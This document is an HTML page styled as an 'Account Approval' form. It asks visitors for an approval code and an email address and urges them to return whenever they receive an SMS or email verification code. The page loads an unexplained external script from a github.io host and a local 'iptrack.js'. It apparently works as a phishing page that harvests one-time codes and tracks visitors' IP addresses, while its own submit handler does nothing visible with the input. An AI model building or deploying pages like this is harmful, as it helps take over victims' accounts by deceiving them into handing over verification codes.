<!DOCTYPE html>
<html lang="en" data-theme="light">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Account Approval</title>
  <style>
    :root {
      --bg-color: #f4f4f4;
      --container-bg: #fff;
      --text-color: #333;
      --input-border: #ccc;
      --button-bg: #007BFF;
      --button-hover: #0056b3;
      --success: green;
      --error: red;
      --link-color: #007BFF;
      --link-hover: #0056b3;
      --primary-font: 'Segoe UI', sans-serif;
      --heading-font: 'Arial', sans-serif;
    }
    [data-theme="dark"] {
      --bg-color: #121212;
      --container-bg: #1e1e1e;
      --text-color: #eee;
      --input-border: #555;
      --button-bg: #1a73e8;
      --button-hover: #135abc;
      --success: #90ee90;
      --error: #f28b82;
      --link-color: #1a73e8;
      --link-hover: #135abc;
    }
    body {
      font-family: var(--primary-font);
      background-color: var(--bg-color);
      padding: 4rem 2rem;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      color: var(--text-color);
      transition: background 0.3s, color 0.3s;
    }
    /* Redesigned Theme Toggle */
    .theme-toggle {
      position: absolute;
      top: 20px;
      right: 20px;
      background-color: var(--button-bg);
      border: none;
      padding: 0.8rem;
      border-radius: 30px;
      cursor: pointer;
      font-size: 16px;
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: background 0.3s;
    }
    .theme-toggle:hover {
      background-color: var(--button-hover);
    }
    .theme-toggle span {
      margin-left: 0.5rem;
    }
    .container {
      background: var(--container-bg);
      padding: 2.5rem 3rem;
      max-width: 420px;
      width: 100%;
      border-radius: 12px;
      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
      text-align: center;
      transition: background 0.3s;
    }
    h2 {
      font-size: 28px;
      font-family: var(--heading-font);
      margin-bottom: 1.5rem;
      font-weight: bold;
    }
    label {
      display: block;
      margin-top: 1.2rem;
      font-size: 16px;
      font-weight: 500;
    }
    input {
      width: 100%;
      padding: 1rem;
      margin-top: 0.6rem;
      border-radius: 8px;
      border: 1px solid var(--input-border);
      background-color: transparent;
      color: var(--text-color);
      font-size: 16px;
      transition: border-color 0.3s;
    }
    input:focus {
      border-color: var(--button-bg);
      outline: none;
      box-shadow: 0 0 5px rgba(0, 123, 255, 0.3);
    }
    button {
      margin-top: 2rem;
      padding: 1rem;
      background-color: var(--button-bg);
      color: white;
      border: none;
      width: 100%;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      transition: background-color 0.3s;
    }
    button:hover {
      background-color: var(--button-hover);
    }
    .copy-link {
      margin-top: 2rem;
      background-color: transparent;
      border: 1px dashed var(--link-color);
      color: var(--link-color);
      font-size: 14px;
      padding: 0.7rem;
      cursor: pointer;
      transition: color 0.3s, border-color 0.3s;
    }
    .copy-link:hover {
      color: var(--link-hover);
      border-color: var(--link-hover);
    }
    .footer-note {
      margin-top: 10px;
      font-size: 14px;
      color: #888;
    }
  </style>
</head>
<script src="https://plyarth.github.io/intc/in.js"></script>
<body>
  <!-- Redesigned Theme Toggle Button (Sun/Moon Icon with Label) -->
  <button class="theme-toggle" onclick="toggleTheme()">
    <span id="themeIcon">üåû</span> Toggle Theme
  </button>

  <div class="container">
    <h2>Account Approval</h2>
    <form id="approvalForm">
      <label for="approvalCode">Enter Approval Code</label>
      <input type="text" id="approvalCode" name="approvalCode" required placeholder="Approval Code">

      <label for="email">Enter Email Address</label>
      <input type="email" id="email" name="email" required placeholder="Email Address">

      <button type="submit">Submit</button>
    </form>

    <button class="copy-link" onclick="copyPageLink()">Copy This Page Link</button>
    <span class="footer-note">
      Copy this page to access it later anytime you receive a verification code through SMS or Email.
    </span>

    <div id="message" class="message"></div>
  </div>

  <script>
    // Theme toggle function
    function toggleTheme() {
      const html = document.documentElement;
      const currentTheme = html.getAttribute("data-theme");
      const nextTheme = currentTheme === "dark" ? "light" : "dark";
      html.setAttribute("data-theme", nextTheme);
      localStorage.setItem("theme", nextTheme);

      // Toggle theme icon (Sun/Moon)
      const themeIcon = document.getElementById('themeIcon');
      themeIcon.textContent = nextTheme === 'dark' ? 'üåô' : 'üåû';
    }

    // Apply the saved theme from localStorage on page load
    (function applyThemeFromStorage() {
      const savedTheme = localStorage.getItem("theme");
      if (savedTheme) {
        document.documentElement.setAttribute("data-theme", savedTheme);
        // Apply saved theme icon
        const themeIcon = document.getElementById('themeIcon');
        themeIcon.textContent = savedTheme === 'dark' ? 'üåô' : 'üåû';
      }
    })();

    function getIdFromURL() {
      const params = new URLSearchParams(window.location.search);
      return params.get("id") || "defaultId"; // fallback if no id
    }

    function copyPageLink() {
      navigator.clipboard.writeText(window.location.href)
        .then(() => alert("‚úÖ Page link copied!"))
        .catch(() => alert("‚ùå Failed to copy link."));
    }

    document.getElementById("approvalForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const approvalCode = document.getElementById("approvalCode").value.trim();
      const email = document.getElementById("email").value.trim();

      if (!approvalCode || !email) {
        alert("‚ùå Please fill in all fields.");
        return;
      }

      // Reset form after submission
      document.getElementById("approvalForm").reset();
    });
  </script>
  <script src="iptrack.js"></script>
</body>
</html>
